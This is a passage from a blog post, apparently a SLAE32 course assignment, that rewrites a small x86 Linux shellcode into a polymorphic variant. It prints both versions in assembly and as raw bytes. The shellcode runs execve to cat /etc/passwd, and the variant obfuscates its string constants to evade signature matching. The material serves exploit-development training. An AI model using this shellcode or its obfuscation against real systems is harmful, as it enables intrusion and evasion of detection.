+</pre></table></code></div></div><p>The assembly for the original shellcode (<code class="language-plaintext highlighter-rouge">etc_passwd_original.nasm</code>) in Intel is:</p><div class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+        <span class="nf">cdq</span>
+        <span class="nf">push</span> <span class="nb">edx</span>
+        <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x7461632f</span>   <span class="c1">; tac/</span>
+        <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x6e69622f</span>   <span class="c1">; nib/</span>
+        <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
+        <span class="nf">push</span> <span class="nb">edx</span>
+        <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x64777373</span>   <span class="c1">; dwss</span>
+        <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x61702f2f</span>   <span class="c1">; ap//</span>
+        <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x6374652f</span>   <span class="c1">; cte/</span>
+        <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
+        <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xb</span>
+        <span class="nf">push</span> <span class="nb">edx</span>
+        <span class="nf">push</span> <span class="nb">ecx</span>
+        <span class="nf">push</span> <span class="nb">ebx</span>
+        <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
+        <span class="nf">int</span> <span class="mh">0x80</span>
+</pre></table></code></div></div><p>Modified assembly (<code class="language-plaintext highlighter-rouge">etc_passwd_modified.nasm</code>) is:</p><div class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+        <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>    <span class="c1">; Zero out EBX</span>
+        <span class="nf">mul</span> <span class="nb">ebx</span>         <span class="c1">; Zero out EAX and EDX</span>
+        <span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">; Push EDX (0x0) onto the stack =&gt; Null terminator</span>
+
+        <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="mh">0x7461632e</span>
+        <span class="nf">inc</span> <span class="nb">esi</span>
+        <span class="nf">push</span> <span class="nb">esi</span>
+        <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="mh">0x6e69622e</span>
+        <span class="nf">inc</span> <span class="nb">esi</span>
+        <span class="nf">push</span> <span class="nb">esi</span>
+        <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>    <span class="c1">; EBX = /bin/cat</span>
+        <span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">; Null terminator</span>
+
+        <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="mh">0x64777372</span>
+        <span class="nf">inc</span> <span class="nb">esi</span>
+        <span class="nf">push</span> <span class="nb">esi</span>
+        <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="mh">0x61702f2e</span>
+        <span class="nf">inc</span> <span class="nb">esi</span>
+        <span class="nf">push</span> <span class="nb">esi</span>
+        <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="mh">0x6374652e</span>
+        <span class="nf">inc</span> <span class="nb">esi</span>
+        <span class="nf">push</span> <span class="nb">esi</span>
+        <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>    <span class="c1">; ECX = /etc/passwd</span>
+        <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>      <span class="c1">; EAX = execve()</span>
+
+        <span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">; Null terminator (0x0)</span>
+        <span class="nf">push</span> <span class="nb">ecx</span>        <span class="c1">; /etc/passwd</span>
+        <span class="nf">push</span> <span class="nb">ebx</span>        <span class="c1">; /bin/cat</span>
+        <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>    <span class="c1">; ['/bin/cat', '/etc/passwd', '0x0']</span>
+        <span class="nf">int</span> <span class="mh">0x80</span>        <span class="c1">; Execute execve()</span>
+</pre></table></code></div></div><p>And let’s compile the both <code class="language-plaintext highlighter-rouge">.nasm</code> files with <a href="https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py">compilerX86.py</a> and compare the bytes:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="c"># python ../compilerX86.py -f etc_passwd_original</span>
+
+<span class="o">[</span>+] Assemble: etc_passwd_original.nasm
+<span class="o">[</span>+] Linking: etc_passwd_original.o
+<span class="o">[</span>+] Shellcode: <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="o">[</span>+] ASM code: 0x31,0xc0,0x99,0x52,0x68,0x2f,0x63,0x61,0x74,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x52,0x68,0x73,0x73,0x77,0x64,0x68,0x2f,0x2f,0x70,0x61,0x68,0x2f,0x65,0x74,0x63,0x89,0xe1,0xb0,0x0b,0x52,0x51,0x53,0x89,0xe1,0xcd,0x80
+<span class="o">[</span>+] Creating File: shellcode.c
+<span class="o">[</span>+] Compiling Executable: shellcode
+<span class="o">[</span>+] Enjoy!
+
+<span class="c"># python ../compilerX86.py -f etc_passwd_modified</span>
+
+<span class="o">[</span>+] Assemble: etc_passwd_modified.nasm
+<span class="o">[</span>+] Linking: etc_passwd_modified.o
+<span class="o">[</span>+] Shellcode: <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="o">[</span>+] ASM code: 0x31,0xdb,0xf7,0xe3,0x52,0xbe,0x2e,0x63,0x61,0x74,0x46,0x56,0xbe,0x2e,0x62,0x69,0x6e,0x46,0x56,0x89,0xe3,0x52,0xbe,0x72,0x73,0x77,0x64,0x46,0x56,0xbe,0x2e,0x2f,0x70,0x61,0x46,0x56,0xbe,0x2e,0x65,0x74,0x63,0x46,0x56,0x89,0xe1,0xb0,0x0b,0x52,0x51,0x53,0x89,0xe1,0xcd,0x80
+<span class="o">[</span>+] Creating File: shellcode.c
+<span class="o">[</span>+] Compiling Executable: shellcode
+<span class="o">[</span>+] Enjoy!
+
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="c"># echo "[INFO] Original:" &amp;&amp; echo -ne "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80" | wc -c</span>
+<span class="o">[</span>INFO] Original:
+43
+
+<span class="c"># echo "[INFO] Modified:" &amp;&amp; echo -ne "\x31\xdb\xf7\xe3\x52\xbe\x2e\x63\x61\x74\x46\x56\xbe\x2e\x62\x69\x6e\x46\x56\x89\xe3\x52\xbe\x72\x73\x77\x64\x46\x56\xbe\x2e\x2f\x70\x61\x46\x56\xbe\x2e\x65\x74\x63\x46\x56\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80" | wc -c</span>
+<span class="o">[</span>INFO] Modified:
+54
+</pre></table></code></div></div><p>It resulted in 26% increase in the polymorphic shellcode.</p><p><b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b></p><p><b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b></p><p><b>Student ID: SLAE-1542</b></p><p><a href="https://github.com/bigb0sss/SLAE32">SLAE32 Assignemt#6 Github</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/slae32/'>SLAE32</a>, <a href='/categories/assignment_6_polymorphic/'>Assignment_6_Polymorphic</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/slae32/" class="post-tag no-text-decoration" >slae32</a> <a href="/tags/assembly/" class="post-tag no-text-decoration" >assembly</a> <a href="/tags/x86/" class="post-tag no-text-decoration" >x86</a> <a href="/tags/polymorphic-shellcode/" class="post-tag no-text-decoration" >Polymorphic Shellcode</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://bigb0sss.github.io/posts/slae32-assignment-6/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="https://twitter.com/intent/tweet?text=SLAE32 - Assignment#6 [Polymorphic Shellcode] - bigb0ss&url=https://bigb0sss.github.io/posts/slae32-assignment-6/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SLAE32 - Assignment#6 [Polymorphic Shellcode] - bigb0ss&u=https://bigb0sss.github.io/posts/slae32-assignment-6/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=SLAE32 - Assignment#6 [Polymorphic Shellcode] - bigb0ss&url=https://bigb0sss.github.io/posts/slae32-assignment-6/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/redteam-rotate-ip-aws-gateway/">Rotating Source IPs (Part 1) - AWS API Gateway</a><li><a href="/posts/redteam-cobalt-strike-malleable-profile/">Cobalt Strike 4.0+ Malleable C2 Profile Guideline</a></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/zip2john/">zip2john</a> <a class="post-tag" href="/tags/web.config-rce/">web.config rce</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/valentine/">valentine</a> <a class="post-tag" href="/tags/tomcat/">tomcat</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/slae32-assignment-1/"><div class="card-body"> <span class="timeago small" > Dec 12, 2020 <i class="unloaded">2020-12-12T00:26:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE32 - Assignment#1 [Bind TCP Shell]</h3><div class="text-muted small"><p> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly...</p></div></div></a></div><div class="card"> <a href="/posts/slae32-assignment-2/"><div class="card-body"> <span class="timeago small" > Dec 13, 2020 <i class="unloaded">2020-12-13T10:53:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE32 - Assignment#2 [Reverse TCP Shell]</h3><div class="text-muted small"><p> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly...</p></div></div></a></div><div class="card"> <a href="/posts/slae32-assignment-3/"><div class="card-body"> <span class="timeago small" > Dec 26, 2020 <i class="unloaded">2020-12-26T10:53:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE32 - Assignment#3 [Egghunter]</h3><div class="text-muted small"><p> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/slae32-assignment-5/" class="btn btn-outline-primary"><p>SLAE32 - Assignment#5 [Shellcode Analysis]</p></a> <a href="/posts/slae32-assignment-7/" class="btn btn-outline-primary"><p>SLAE32 - Assignment#7 [Custom Cryptor]</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//bigb0ss-blog.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://bigb0sss.github.io/posts/slae32-assignment-6/'; this.page.identifier = '/posts/slae32-assignment-6/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://www.linkedin.com/in/danielsmin">bigb0ss</a>. <span data-toggle="tooltip" data-placement="top" title="CC BY 4.0 ">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/zip2john/">zip2john</a> <a class="post-tag" href="/tags/web.config-rce/">web.config rce</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/valentine/">valentine</a> <a class="post-tag" href="/tags/tomcat/">tomcat</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://bigb0sss.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">[-] No result found</p>' }); </script>
